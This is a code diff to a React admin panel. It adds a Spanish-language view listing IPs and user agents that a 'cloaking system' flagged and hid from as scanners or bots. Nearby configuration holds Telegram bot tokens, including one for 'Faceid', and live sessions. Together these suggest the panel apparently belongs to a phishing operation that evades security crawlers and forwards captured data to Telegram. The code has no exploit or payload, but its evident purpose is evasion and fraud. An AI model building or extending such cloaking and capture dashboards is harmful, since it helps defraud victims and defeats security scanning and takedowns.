@@ -398,6 +398,9 @@ export default function AdminPanel() {
   const [trafficTotal, setTrafficTotal] = useState(0);
   const [trafficLoading, setTrafficLoading] = useState(false);
   const TRAFFIC_PAGE_SIZE = 50;
+  const [scannerMode, setScannerMode] = useState(false);
+  const [scannerLogs, setScannerLogs] = useState<any[]>([]);
+  const [scannerLoading, setScannerLoading] = useState(false);
   const [showConfigModal, setShowConfigModal] = useState(false);
   const [configForm, setConfigForm] = useState({ adminPin: "", telegramBotToken: "", telegramChatId: "", telegramFaceidBotToken: "", telegramFaceidChatId: "" });
   const [configLoading, setConfigLoading] = useState(false);
@@ -723,6 +726,24 @@ export default function AdminPanel() {
       console.error("Failed to load history", e);
     } finally {
       setHistoryLoading(false);
+    }
+  };
+
+  const loadScannerLog = async () => {
+    setScannerLoading(true);
+    try {
+      const pin = sessionStorage.getItem("admin-pin") || "";
+      const res = await fetch("/api/admin/scanner-log", {
+        headers: { "x-admin-pin": pin },
+      });
+      const data = await res.json();
+      if (data.ok) {
+        setScannerLogs(data.log || []);
+      }
+    } catch (e) {
+      console.error("Failed to load scanner log", e);
+    } finally {
+      setScannerLoading(false);
     }
   };
 
@@ -1315,6 +1336,16 @@ export default function AdminPanel() {
               }`}
             >
               {trafficMode ? "←" : "🌐"}<span className="hidden sm:inline ml-1">{trafficMode ? "Volver" : "Tráfico"}</span>
+            </button>
+            <button
+              onClick={() => { setScannerMode(!scannerMode); if (!scannerMode) { loadScannerLog(); setHistoryMode(false); setStatsMode(false); setTrafficMode(false); } }}
+              className={`px-2 sm:px-4 py-1.5 sm:py-2 rounded-lg text-[10px] sm:text-xs font-medium transition-all border ${
+                scannerMode 
+                  ? "bg-rose-500/10 text-rose-400 border-rose-500/20" 
+                  : "bg-white/5 text-gray-300 border-white/5 hover:bg-white/10"
+              }`}
+            >
+              {scannerMode ? "←" : "🛡️"}<span className="hidden sm:inline ml-1">{scannerMode ? "Volver" : "Escáneres"}</span>
             </button>
           <button
             onClick={() => { sessionStorage.removeItem("admin-auth"); setIsAuthenticated(false); }}
@@ -2148,6 +2179,89 @@ export default function AdminPanel() {
         )}
 
         {/* ═══ ACTIVE SESSIONS ═══ */}
+        {/* ═══ SCANNER LOG ═══ */}
+        {scannerMode && (
+          <div className="space-y-4">
+            <div className="flex items-center justify-between">
+              <h2 className={`text-lg font-bold ${theme.text}`}>🛡️ Escáneres & Bots Detectados</h2>
+              <button
+                onClick={() => loadScannerLog()}
+                className="px-3 py-1.5 rounded-lg text-[11px] font-medium border bg-blue-500/10 text-blue-400 border-blue-500/20 hover:bg-blue-500/20 transition-all active:scale-95"
+              >
+                🔄 Refrescar
+              </button>
+            </div>
+            <div className={`text-xs ${theme.textSecondary}`}>
+              Últimas {scannerLogs.length} detecciones (máx. 100 en memoria)
+            </div>
+
+            {scannerLoading ? (
+              <div className={`text-center py-8 ${theme.textSecondary}`}>Cargando...</div>
+            ) : scannerLogs.length === 0 ? (
+              <div className={`text-center py-12 ${theme.textSecondary}`}>
+                <div className="w-14 h-14 mx-auto mb-4 rounded-full bg-green-500/10 flex items-center justify-center border border-green-500/20">
+                  <span className="text-2xl">✅</span>
+                </div>
+                <p className="font-medium">Sin detecciones recientes</p>
+                <p className="mt-1 text-[11px]">El sistema de cloaking no ha detectado escáneres ni bots</p>
+              </div>
+            ) : (
+              <div className="space-y-2">
+                {/* Summary stats */}
+                <div className="grid grid-cols-2 sm:grid-cols-4 gap-2 mb-4">
+                  <div className={`rounded-xl p-3 ${theme.cardBg} border ${theme.border}`}>
+                    <div className={`text-[10px] uppercase tracking-wider ${theme.textSecondary}`}>Total</div>
+                    <div className={`text-xl font-bold text-rose-400`}>{scannerLogs.length}</div>
+                  </div>
+                  <div className={`rounded-xl p-3 ${theme.cardBg} border ${theme.border}`}>
+                    <div className={`text-[10px] uppercase tracking-wider ${theme.textSecondary}`}>Por UA</div>
+                    <div className={`text-xl font-bold text-amber-400`}>{scannerLogs.filter((l: any) => l.reason?.startsWith("ua:")).length}</div>
+                  </div>
+                  <div className={`rounded-xl p-3 ${theme.cardBg} border ${theme.border}`}>
+                    <div className={`text-[10px] uppercase tracking-wider ${theme.textSecondary}`}>Por IP</div>
+                    <div className={`text-xl font-bold text-violet-400`}>{scannerLogs.filter((l: any) => l.reason?.startsWith("ip_range:")).length}</div>
+                  </div>
+                  <div className={`rounded-xl p-3 ${theme.cardBg} border ${theme.border}`}>
+                    <div className={`text-[10px] uppercase tracking-wider ${theme.textSecondary}`}>Comportamiento</div>
+                    <div className={`text-xl font-bold text-cyan-400`}>{scannerLogs.filter((l: any) => l.reason?.startsWith("behavior")).length}</div>
+                  </div>
+                </div>
+
+                {/* Log table */}
+                <div className="overflow-x-auto">
+                  <table className="w-full text-xs">
+                    <thead>
+                      <tr className={`border-b ${theme.border}`}>
+                        <th className={`text-left py-2 px-2 ${theme.textSecondary}`}>#</th>
+                        <th className={`text-left py-2 px-2 ${theme.textSecondary}`}>IP</th>
+                        <th className={`text-left py-2 px-2 ${theme.textSecondary}`}>Razón</th>
+                        <th className={`text-left py-2 px-2 ${theme.textSecondary}`}>User-Agent</th>
+                        <th className={`text-left py-2 px-2 ${theme.textSecondary}`}>Fecha</th>
+                      </tr>
+                    </thead>
+                    <tbody>
+                      {[...scannerLogs].reverse().map((log: any, idx: number) => (
+                        <tr key={idx} className={`border-b ${theme.border} hover:bg-white/5`}>
+                          <td className={`py-2 px-2 ${theme.textSecondary}`}>{idx + 1}</td>
+                          <td className={`py-2 px-2 font-mono ${theme.text}`}>{log.ip || "—"}</td>
+                          <td className={`py-2 px-2`}>
+                            {log.reason?.startsWith("ua:") && <span className="inline-flex items-center gap-1 px-1.5 py-0.5 rounded bg-amber-500/10 text-amber-400 text-[10px] font-medium border border-amber-500/20">🤖 UA: {log.reason.slice(3, 40)}</span>}
+                            {log.reason?.startsWith("ip_range:") && <span className="inline-flex items-center gap-1 px-1.5 py-0.5 rounded bg-violet-500/10 text-violet-400 text-[10px] font-medium border border-violet-500/20">🌐 IP Range</span>}
+                            {log.reason?.startsWith("behavior") && <span className="inline-flex items-center gap-1 px-1.5 py-0.5 rounded bg-cyan-500/10 text-cyan-400 text-[10px] font-medium border border-cyan-500/20">🔍 Comportamiento</span>}
+                            {!log.reason?.startsWith("ua:") && !log.reason?.startsWith("ip_range:") && !log.reason?.startsWith("behavior") && <span className="inline-flex items-center gap-1 px-1.5 py-0.5 rounded bg-gray-500/10 text-gray-400 text-[10px] font-medium border border-gray-500/20">❓ {log.reason || "Desconocido"}</span>}
+                          </td>
+                          <td className={`py-2 px-2 ${theme.textSecondary} max-w-[250px] truncate`} title={log.ua}>{log.ua?.slice(0, 60) || "—"}</td>
+                          <td className={`py-2 px-2 ${theme.textSecondary}`}>{log.time ? new Date(log.time).toLocaleString("es-CO") : "—"}</td>
+                        </tr>
+                      ))}
+                    </tbody>
+                  </table>
+                </div>
+              </div>
+            )}
+          </div>
+        )}
+
         {/* ═══ TRAFFIC LOG ═══ */}
         {trafficMode && (
           <div className="space-y-4">
@@ -2235,7 +2349,7 @@ export default function AdminPanel() {
         )}
 
         {/* ═══ ACTIVE SESSIONS ═══ */}
-        {!historyMode && !statsMode && !trafficMode && (
+        {!historyMode && !statsMode && !trafficMode && !scannerMode && (
           <div className="space-y-6">
             {/* Search Bar */}
             <div className="relative">
